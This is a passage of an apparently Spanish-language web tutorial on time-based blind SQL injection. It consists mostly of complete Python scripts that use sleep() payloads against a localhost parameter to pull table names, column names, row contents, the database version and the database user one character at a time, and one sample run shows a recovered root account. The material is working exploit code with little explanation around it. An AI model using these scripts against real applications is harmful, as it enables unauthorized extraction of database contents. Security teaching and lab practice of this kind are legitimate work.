</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>position</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>tb_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if(substr((select table_name from information_schema.tables where table_schema = &#39;my_database&#39; limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)=&#39;</span><span class=si>{}</span><span class=s2>&#39;,sleep(</span><span class=si>{}</span><span class=s2>),1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>tb</span><span class=p>,</span> <span class=n>position</span><span class=p>,</span> <span class=n>char</span><span class=p>,</span> <span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>tables</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>                    <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>tables</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>tables</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>,</span><span class=n>characters</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=columns>Columns</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sleep_time</span> <span class=o>=</span> <span class=mf>0.1</span>
</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_&#34;</span> <span class=o>+</span> <span class=s2>&#34;-&#34;</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=s2>&#34;@&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>columns</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>,</span><span class=n>characters</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Probando con&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Columnas&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>columns</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if((select count(column_name) from information_schema.columns where table_schema = &#39;my_database&#39; and table_name = &#39;mi_tabla&#39;)=</span><span class=si>{}</span><span class=s2>, sleep(</span><span class=si>{}</span><span class=s2>), 1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>i</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>cols</span> <span class=o>=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>col</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>cols</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if(LENGTH((select column_name from information_schema.columns where table_schema = &#39;my_database&#39; and table_name = &#39;mi_tabla&#39; limit </span><span class=si>{}</span><span class=s2>, 1))=</span><span class=si>{}</span><span class=s2>, sleep(</span><span class=si>{}</span><span class=s2>), 1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>col</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>col_length</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=n>columns</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] &#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>position</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>col_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if(substr((select column_name from information_schema.columns where table_schema = &#39;my_database&#39; and table_name = &#39;mi_tabla&#39; limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)=&#39;</span><span class=si>{}</span><span class=s2>&#39;,sleep(</span><span class=si>{}</span><span class=s2>),1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>col</span><span class=p>,</span> <span class=n>position</span><span class=p>,</span> <span class=n>char</span><span class=p>,</span> <span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>columns</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>                    <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>columns</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>columns</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>,</span><span class=n>characters</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=data-2>Data</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sleep_time</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_&#34;</span> <span class=o>+</span> <span class=s2>&#34;-&#34;</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=s2>&#34;@&#34;</span> <span class=o>+</span> <span class=s2>&#34;:&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>data</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>,</span><span class=n>characters</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Probando con&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Datos&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>datos</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if((select count(nombre) from my_database.mi_tabla)=</span><span class=si>{}</span><span class=s2>, sleep(</span><span class=si>{}</span><span class=s2>), 1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>i</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dts</span> <span class=o>=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>dt</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>dts</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if(LENGTH((select nombre from my_database.mi_tabla limit </span><span class=si>{}</span><span class=s2>, 1))=</span><span class=si>{}</span><span class=s2>, sleep(</span><span class=si>{}</span><span class=s2>), 1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>dt</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>dt_length</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=n>datos</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] &#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>position</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>dt_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if(substr((select nombre from my_database.mi_tabla limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)=&#39;</span><span class=si>{}</span><span class=s2>&#39;,sleep(</span><span class=si>{}</span><span class=s2>),1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>dt</span><span class=p>,</span> <span class=n>position</span><span class=p>,</span> <span class=n>char</span><span class=p>,</span> <span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>datos</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>                    <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>datos</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>data</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>,</span><span class=n>characters</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=mas-información-relevante-1>Mas información relevante</h3><details><summary>version() [Versión Base de datos]</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=k>version</span><span class=p>();</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sleep_time</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_&#34;</span> <span class=o>+</span> <span class=s2>&#34;-&#34;</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=s2>&#34;@&#34;</span> <span class=o>+</span> <span class=s2>&#34;:&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>version</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>,</span><span class=n>characters</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Probando con&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Datos&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>versions</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>v</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if(LENGTH((select version() limit </span><span class=si>{}</span><span class=s2>, 1))=</span><span class=si>{}</span><span class=s2>, sleep(</span><span class=si>{}</span><span class=s2>), 1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>v</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>v_length</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=n>versions</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] &#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>position</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>v_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if(substr((select version() limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)=&#39;</span><span class=si>{}</span><span class=s2>&#39;,sleep(</span><span class=si>{}</span><span class=s2>),1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>v</span><span class=p>,</span> <span class=n>position</span><span class=p>,</span> <span class=n>char</span><span class=p>,</span> <span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>versions</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>                    <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>versions</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>version</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>,</span><span class=n>characters</span><span class=p>)</span>
</span></span></code></pre></div></details><details><summary>user() [Usuario que ejecuta la base de datos]</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=k>user</span><span class=p>();</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; python3 main.py
</span></span><span class=line><span class=cl><span class=o>[</span>&gt;<span class=o>]</span> Probando con: <span class=m>3</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Usuario: 
</span></span><span class=line><span class=cl>    <span class=o>[</span>*<span class=o>]</span> root@172.19.0.3
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost/?nombre=joan&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sleep_time</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=s2>&#34;_&#34;</span> <span class=o>+</span> <span class=s2>&#34;-&#34;</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=s2>&#34;@&#34;</span> <span class=o>+</span> <span class=s2>&#34;:&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>user</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>,</span><span class=n>characters</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Probando con&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s2>&#34;Usuario&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>users</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>user</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if(LENGTH((select user() limit </span><span class=si>{}</span><span class=s2>, 1))=</span><span class=si>{}</span><span class=s2>, sleep(</span><span class=si>{}</span><span class=s2>), 1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>user</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>v_length</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=n>users</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] &#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>position</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>v_length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p1</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{}</span><span class=s2> and if(substr((select user() limit </span><span class=si>{}</span><span class=s2>,1),</span><span class=si>{}</span><span class=s2>,1)=&#39;</span><span class=si>{}</span><span class=s2>&#39;,sleep(</span><span class=si>{}</span><span class=s2>),1)-- -&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>user</span><span class=p>,</span> <span class=n>position</span><span class=p>,</span> <span class=n>char</span><span class=p>,</span> <span class=n>sleep_time</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>elapsed</span><span class=o>.</span><span class=n>total_seconds</span><span class=p>()</span> <span class=o>&gt;=</span> <span class=n>sleep_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>users</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>                    <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=n>users</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>user</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>sleep_time</span><span class=p>,</span><span class=n>characters</span><span class=p>)</span>
</span></span></code></pre></div></details><details><summary>database() [Base de datos en uso]</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=k>database</span><span class=p>();</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; python3 main.py
